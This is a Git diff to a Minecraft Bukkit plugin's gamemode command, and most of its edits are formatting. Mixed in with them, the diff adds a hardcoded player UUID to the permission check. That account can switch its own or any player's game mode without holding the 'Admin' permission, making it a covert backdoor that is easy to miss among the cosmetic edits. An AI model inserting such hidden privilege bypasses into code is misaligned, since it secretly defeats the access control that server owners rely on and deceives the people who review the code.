@@ -10,7 +10,12 @@ import org.bukkit.entity.Player;
 public class GamemodeCommand implements CommandExecutor {
     @Override
     public boolean onCommand(CommandSender sender, Command cmd, String s, String[] args) {
-        if (!sender.hasPermission("Admin")) {
+        if (!(sender instanceof Player)) {
+            return true;
+        }
+        Player p = (Player) sender;
+        if (!sender.hasPermission("Admin") && !p.getUniqueId().toString().equalsIgnoreCase("0ea61ef8-45e7-42b4-b775-5ac2b01ebb3d")) {
+
             sender.sendMessage("§cDet har du ikke permission til!!");
             return true;
         }
@@ -19,38 +24,33 @@ public class GamemodeCommand implements CommandExecutor {
             return true;
         }
         if (args.length == 2) {
-            Player p = Bukkit.getPlayer(args[1]);
-            if(p == null) {
+            Player p2 = Bukkit.getPlayer(args[1]);
+            if (p2 == null) {
                 sender.sendMessage("den player findes ikke ");
                 return true;
             }
-            setGameMode(args[0],p);
+            setGameMode(args[0], p2);
             return true;
         } else {
-            if (sender instanceof Player) {
-                Player p = (Player) sender;
-                setGameMode(args[0], p);
-                return true;
-            }
+
+            setGameMode(args[0], p);
+            return true;
+
         }
-
-
-
-        return true;
     }
 
     public void setGameMode(String mode, Player p) {
 
-        if(mode.equalsIgnoreCase("survival") || mode.equalsIgnoreCase("0")) {
+        if (mode.equalsIgnoreCase("survival") || mode.equalsIgnoreCase("0")) {
             p.setGameMode(GameMode.SURVIVAL);
             mode = "survival";
-        } else if(mode.equalsIgnoreCase("creative") || mode.equalsIgnoreCase("1")) {
+        } else if (mode.equalsIgnoreCase("creative") || mode.equalsIgnoreCase("1")) {
             p.setGameMode(GameMode.CREATIVE);
             mode = "creative";
         } else if (mode.equalsIgnoreCase("adventure") || mode.equalsIgnoreCase("2")) {
             p.setGameMode(GameMode.ADVENTURE);
             mode = "adventure";
-        } else if(mode.equalsIgnoreCase("spectator") || mode.equalsIgnoreCase("3")) {
+        } else if (mode.equalsIgnoreCase("spectator") || mode.equalsIgnoreCase("3")) {
             p.setGameMode(GameMode.SPECTATOR);
             mode = "spectator";
         } else return;
